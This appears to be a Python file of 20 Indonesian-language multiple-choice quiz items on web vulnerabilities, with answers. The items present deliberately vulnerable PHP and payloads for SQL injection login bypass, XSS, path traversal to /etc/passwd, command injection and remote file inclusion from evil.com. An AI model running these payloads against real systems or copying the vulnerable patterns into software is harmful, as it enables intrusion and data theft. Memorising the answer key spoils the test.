questions = [
        {
            'number': 1,
            'difficulty': 'Medium',
            'type': 'SQL Injection',
            'title': 'Identifikasi Kerentanan SQL Injection',
            'code': """$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

if(mysqli_num_rows($result) > 0) {
    echo "Login berhasil!";
}""",
            'question': 'Payload mana yang dapat digunakan untuk bypass login tanpa mengetahui password yang valid?',
            'options': [
                "admin'; DROP TABLE users; --",
                "admin' OR '1'='1' --",
                "admin'/*comment*/",
                "admin' AND 1=0 --"
            ],
            'answer': 'b'
        },
        {
            'number': 2,
            'difficulty': 'Easy',
            'type': 'Cross-Site Scripting (XSS)',
            'title': 'Stored XSS Vulnerability',
            'code': """<?php
$comment = $_POST['comment'];
$sql = "INSERT INTO comments (content) VALUES ('$comment')";
mysqli_query($conn, $sql);

// Menampilkan komentar
$result = mysqli_query($conn, "SELECT * FROM comments");
while($row = mysqli_fetch_assoc($result)) {
    echo "<div>" . $row['content'] . "</div>";
}
?>""",
            'question': 'Payload XSS mana yang akan berhasil dieksekusi ketika komentar ditampilkan?',
            'options': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')></svg>",
                "Semua payload di atas dapat berhasil"
            ],
            'answer': 'd'
        },
        {
            'number': 3,
            'difficulty': 'Hard',
            'type': 'Local File Inclusion (LFI)',
            'title': 'Path Traversal Attack',
            'code': """<?php
$page = $_GET['page'];
$file_path = "pages/" . $page . ".php";

if(file_exists($file_path)) {
    include($file_path);
} else {
    echo "File tidak ditemukan";
}
?>""",
            'question': 'Payload mana yang dapat digunakan untuk membaca file /etc/passwd?',
            'options': [
                "../../../etc/passwd",
                "../../../etc/passwd%00",
                "....//....//....//etc/passwd",
                "Semua payload di atas dapat berhasil"
            ],
            'answer': 'b'
        },
        {
            'number': 4,
            'difficulty': 'Medium',
            'type': 'Command Injection',
            'title': 'OS Command Injection',
            'code': """<?php
$host = $_POST['host'];
$command = "ping -c 4 " . $host;
$output = shell_exec($command);
echo "<pre>" . $output . "</pre>";
?>""",
            'question': 'Payload mana yang dapat digunakan untuk menjalankan command tambahan?',
            'options': [
                "127.0.0.1; cat /etc/passwd",
                "127.0.0.1 && ls -la",
                "127.0.0.1 | whoami",
                "Semua payload di atas dapat berhasil"
            ],
            'answer': 'd'
        },
        {
            'number': 5,
            'difficulty': 'Easy',
            'type': 'IDOR (Insecure Direct Object Reference)',
            'title': 'Broken Access Control',
            'code': """<?php
session_start();
$user_id = $_GET['id'];

$query = "SELECT * FROM users WHERE id = $user_id";
$result = mysqli_query($conn, $query);
$user = mysqli_fetch_assoc($result);

echo "Nama: " . $user['name'];
echo "Email: " . $user['email'];
echo "Alamat: " . $user['address'];
?>""",
            'question': 'Apa masalah keamanan utama dalam kode di atas?',
            'options': [
                "Tidak ada validasi apakah user yang login berhak mengakses profil tersebut",
                "Query SQL rentan terhadap SQL injection",
                "Output tidak di-escape sehingga rentan XSS",
                "Semua masalah di atas benar"
            ],
            'answer': 'd'
        },
        {
        'number': 6,
        'difficulty': 'Medium',
        'type': 'XSS',
        'title': 'Cegah XSS dengan htmlspecialchars',
        'code': """<?php echo $_GET['msg']; ?>""",
        'question': 'Cara aman untuk menampilkan input user di HTML?',
        'options': [
            "Gunakan htmlentities()",
            "Gunakan htmlspecialchars()",
            "Gunakan addslashes()",
            "Gunakan md5()"
        ],
        'answer': 'b'
    },
    {
        'number': 7,
        'difficulty': 'Medium',
        'type': 'File Inclusion',
        'title': 'LFI dengan Parameter GET',
        'code': """$file = $_GET['page'];
include("pages/" . $file);""",
        'question': 'Payload mana yang dapat digunakan untuk membaca file sensitive?',
        'options': [
            "../../etc/passwd",
            "config.php",
            "?page=index",
            "/index.html"
        ],
        'answer': 'a'
    },
    {
        'number': 8,
        'difficulty': 'Hard',
        'type': 'File Inclusion',
        'title': 'Null Byte Injection',
        'code': """$page = $_GET['page'];
include($page . ".php");""",
        'question': 'Mengapa payload `../../etc/passwd%00` bisa efektif?',
        'options': [
            "Mengganti file jadi .txt",
            "Mengakhiri string sebelum .php",
            "Men-disable fungsi include",
            "Tidak efektif sama sekali"
        ],
        'answer': 'b'
    },
    {
        'number': 9,
        'difficulty': 'Easy',
        'type': 'File Inclusion',
        'title': 'RFI - Remote File Inclusion',
        'code': """include($_GET['file']);""",
        'question': 'Payload mana yang bisa digunakan untuk RFI?',
        'options': [
            "http://evil.com/shell.txt",
            "/etc/passwd",
            "shell.php",
            "index.php"
        ],
        'answer': 'a'
    },
    {
        'number': 10,
        'difficulty': 'Medium',
        'type': 'Command Injection',
        'title': 'Ping Command Injection',
        'code': """$ip = $_GET['ip'];
system("ping -c 1 " . $ip);""",
        'question': 'Payload yang bisa eksploitasi command injection?',
        'options': [
            "127.0.0.1; ls",
            "127.0.0.1 && ls",
            "127.0.0.1 | whoami",
            "Semua jawaban benar"
        ],
        'answer': 'd'
    },
    {
        'number': 11,
        'difficulty': 'Medium',
        'type': 'Command Injection',
        'title': 'Cegah Command Injection',
        'code': """system("ping " . $_GET['host']);""",
        'question': 'Cara paling efektif mencegah command injection?',
        'options': [
            "Gunakan whitelist input",
            "Gunakan htmlspecialchars",
            "Gunakan regex",
            "Ganti command ke echo"
        ],
        'answer': 'a'
    },
    {
        'number': 12,
        'difficulty': 'Easy',
        'type': 'Command Injection',
        'title': 'Injection Melalui Ping Form',
        'code': """shell_exec("ping " . $_GET['host']);""",
        'question': 'Kenapa penggunaan input langsung berbahaya?',
        'options': [
            "Dapat membuat server lebih cepat",
            "Menjalankan perintah tak terduga",
            "Mengaktifkan fitur firewall",
            "Membuat sistem aman"
        ],
        'answer': 'b'
    },
    {
        'number': 13,
        'difficulty': 'Easy',
        'type': 'Access Control',
        'title': 'IDOR - Insecure Direct Object Reference',
        'code': """$uid = $_GET['uid'];
$query = "SELECT * FROM users WHERE id = $uid";""",
        'question': 'Apa risiko dari tidak memverifikasi session user?',
        'options': [
            "Server crash",
            "XSS",
            "User bisa akses data user lain",
            "Tidak ada risiko"
        ],
        'answer': 'c'
    },
    {
        'number': 14,
        'difficulty': 'Medium',
        'type': 'Access Control',
        'title': 'Access Control List',
        'code': """if($_SESSION['role'] == 'admin') {
  // allow access
}""",
        'question': 'Bagaimana cara mencegah privilege escalation?',
        'options': [
            "Validasi input",
            "Cek session role dengan ketat di setiap endpoint",
            "Gunakan HTTPS",
            "Block semua IP asing"
        ],
        'answer': 'b'
    },
    {
        'number': 15,
        'difficulty': 'Hard',
        'type': 'Access Control',
        'title': 'Broken Access Control pada API',
        'code': """GET /api/user/1234""",
        'question': 'Tanpa autentikasi, apa resiko endpoint ini?',
        'options': [
            "Server lambat",
            "Dapat dimanfaatkan untuk scraping",
            "User dapat mengakses data user lain (IDOR)",
            "Error 404"
        ],
        'answer': 'c'
    },
    {
        'number': 16,
        'difficulty': 'Easy',
        'type': 'SQL Injection',
        'title': 'Bypass Login via SQLi',
        'code': """$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);""",
        'question': 'Payload mana yang dapat digunakan untuk bypass login?',
        'options': [
            "' OR 1=1 --",
            "' AND 1=0 --",
            "' OR 'x'='y",
            "'; EXEC xp_cmdshell('dir'); --"
        ],
        'answer': 'a'
    },
    {
        'number': 17,
        'difficulty': 'Medium',
        'type': 'SQL Injection',
        'title': 'Error-Based SQLi',
        'code': """$id = $_GET['id'];
$query = "SELECT name FROM users WHERE id = '$id'";""",
        'question': 'Apa tujuan dari payload berikut: `1\' AND updatexml(1,concat(0x7e,(SELECT version())),0)-- -`?',
        'options': [
            "Menampilkan semua user",
            "Menampilkan error dengan info database",
            "Menghapus tabel users",
            "Tidak ada efek"
        ],
        'answer': 'b'
    },
    {
        'number': 18,
        'difficulty': 'Hard',
        'type': 'SQL Injection',
        'title': 'Blind SQLi dengan Delay',
        'code': """$query = "SELECT * FROM accounts WHERE id = '$id'";""",
        'question': "Apa efek dari payload `1' AND SLEEP(5)--`?",
        'options': [
            "Meningkatkan performa query",
            "Server delay 5 detik",
            "Server crash",
            "Tidak ada efek"
        ],
        'answer': 'b'
    },
    {
        'number': 19,
        'difficulty': 'Easy',
        'type': 'XSS',
        'title': 'Reflected XSS',
        'code': """<?php echo "Hello, " . $_GET['name']; ?>""",
        'question': 'Payload mana yang bisa menimbulkan XSS?',
        'options': [
            "<script>alert(1)</script>",
            "<b>name</b>",
            "console.log('XSS')",
            "SELECT * FROM users"
        ],
        'answer': 'a'
    },
    {
        'number': 20,
        'difficulty': 'Medium',
        'type': 'XSS',
        'title': 'Stored XSS',
        'code': """$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments (text) VALUES ('$comment')");""",
        'question': 'Payload mana yang dapat menimbulkan stored XSS?',
        'options': [
            "<img src=x onerror=alert('XSS')>",
            "DROP TABLE comments",
            "' OR 1=1 --",
            "<!-- comment -->"
        ],
        'answer': 'a'
    }
]